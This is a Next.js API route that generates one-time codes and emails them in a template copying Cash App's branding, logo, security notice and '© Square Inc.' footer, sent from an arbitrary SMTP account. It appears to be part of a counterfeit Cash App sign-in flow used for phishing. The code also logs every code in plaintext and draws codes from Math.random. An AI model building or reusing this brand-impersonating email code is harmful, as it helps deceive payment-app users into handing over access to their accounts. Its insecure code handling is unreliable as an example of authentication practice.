import nodemailer from 'nodemailer';
import { NextRequest, NextResponse } from 'next/server';
import { otpStore } from '@/lib/otp-store';

// Generate a 6-digit OTP
function generateOTP(): string {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// Create SMTP transporter
function createTransporter() {
  return nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: parseInt(process.env.SMTP_PORT || '587'),
    secure: process.env.SMTP_PORT === '465',
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });
}

export async function POST(request: NextRequest) {
  try {
    // Validate environment variables first
    if (!process.env.SMTP_HOST || !process.env.SMTP_USER || !process.env.SMTP_PASS || !process.env.SMTP_FROM) {
      console.error('[v0] SMTP configuration missing:', {
        host: !!process.env.SMTP_HOST,
        user: !!process.env.SMTP_USER,
        pass: !!process.env.SMTP_PASS,
        from: !!process.env.SMTP_FROM,
      });
      return NextResponse.json(
        { error: 'Email service not configured. Please contact support.' },
        { status: 500 }
      );
    }

    const { email } = await request.json();

    if (!email) {
      return NextResponse.json(
        { error: 'Email is required' },
        { status: 400 }
      );
    }

    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return NextResponse.json(
        { error: 'Invalid email format' },
        { status: 400 }
      );
    }

    // Generate OTP
    const otp = generateOTP();
    
    console.log('[v0] Generating OTP for email:', email, 'OTP:', otp);

    // Store OTP in memory (in production, use a database or Redis)
    const otpData = {
      email,
      otp,
      timestamp: Date.now(),
      expiresAt: Date.now() + 10 * 60 * 1000, // 10 minutes
    };

    // Create email transporter
    const transporter = createTransporter();

    console.log('[v0] SMTP config:', {
      host: process.env.SMTP_HOST,
      port: process.env.SMTP_PORT,
      secure: process.env.SMTP_PORT === '465',
      from: process.env.SMTP_FROM,
    });

    try {
      console.log('[v0] Verifying SMTP connection...');
      await transporter.verify();
      console.log('[v0] SMTP connection verified');
    } catch (verifyError) {
      console.error('[v0] SMTP verification failed:', verifyError);
      return NextResponse.json(
        { error: 'Email service connection failed. Please check SMTP configuration.' },
        { status: 500 }
      );
    }

    // Send OTP email
    try {
      console.log('[v0] Sending OTP email to:', email);
      // Use the SMTP user email if SMTP_FROM is not a valid email address
      const fromAddress = process.env.SMTP_FROM?.includes('@') 
        ? process.env.SMTP_FROM 
        : `${process.env.SMTP_FROM || 'noreply'} <${process.env.SMTP_USER}>`;
      
      const result = await transporter.sendMail({
        from: fromAddress,
        to: email,
        subject: 'Your Cash App Sign-In Code',
        html: `
          <!DOCTYPE html>
          <html>
          <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
          </head>
          <body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background-color: #f5f5f5;">
            <table style="width: 100%; max-width: 600px; margin: 0 auto; background-color: #ffffff;">
              <tr>
                <td style="padding: 40px 20px; text-align: center;">
                  <!-- Cash App Logo Icon -->
                  <div style="margin-bottom: 30px;">
                    <div style="display: inline-block; width: 60px; height: 60px; background-color: #00D632; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 40px; font-weight: bold; color: white;">$</div>
                  </div>
                  
                  <!-- Heading -->
                  <h1 style="margin: 0 0 30px 0; font-size: 24px; font-weight: 600; color: #111111; letter-spacing: -0.5px;">Sign-In Code</h1>
                  
                  <!-- OTP Code -->
                  <div style="margin: 30px 0; padding: 30px; background-color: #f9f9f9; border-radius: 8px;">
                    <p style="margin: 0 0 15px 0; font-size: 14px; color: #666666; font-weight: 500;">Here is the sign-in code you requested.</p>
                    <div style="font-size: 42px; font-weight: 300; color: #111111; letter-spacing: 4px; font-family: 'Courier New', monospace; margin: 20px 0; line-height: 1.4;">${otp.substring(0, 3)}-${otp.substring(3, 6)}</div>
                  </div>
                  
                  <!-- Security Message -->
                  <div style="margin: 30px 0; padding: 20px; background-color: #f0f7f0; border-left: 4px solid #00D632; border-radius: 4px; text-align: left;">
                    <p style="margin: 0; font-size: 13px; color: #666666; line-height: 1.6;">No one representing Cash App will ever ask for this code over the phone, on social media, or through any other medium.</p>
                  </div>
                  
                  <!-- Additional Info -->
                  <p style="margin: 30px 0 0 0; font-size: 12px; color: #999999; line-height: 1.6;">
                    By logging into Cash App, you agree to the<br>
                    <a href="#" style="color: #00D632; text-decoration: none;">Terms of Service</a> , 
                    <a href="#" style="color: #00D632; text-decoration: none;">E-Sign Consent</a> ,<br>
                    and <a href="#" style="color: #00D632; text-decoration: none;">Privacy Policy</a>
                  </p>
                  
                  <!-- Footer -->
                  <p style="margin: 40px 0 0 0; padding-top: 30px; border-top: 1px solid #e5e5e5; font-size: 12px; color: #999999;">
                    © Square Inc.
                  </p>
                </td>
              </tr>
            </table>
          </body>
          </html>
        `,
      });
      console.log('[v0] Email sent successfully:', result.messageId);
    } catch (sendError) {
      console.error('[v0] Email sending failed:', sendError);
      return NextResponse.json(
        { error: `Failed to send OTP: ${sendError instanceof Error ? sendError.message : 'Unknown error'}` },
        { status: 500 }
      );
    }

    // Store OTP using persistent store
    otpStore.setOTP(email, otp, 10 * 60 * 1000); // 10 minutes

    return NextResponse.json({
      success: true,
      message: 'OTP sent to email',
      expiresIn: 600, // 10 minutes in seconds
    });
  } catch (error) {
    console.error('[v0] OTP endpoint error:', error);
    return NextResponse.json(
      { error: `Server error: ${error instanceof Error ? error.message : 'Unknown error'}` },
      { status: 500 }
    );
  }
}
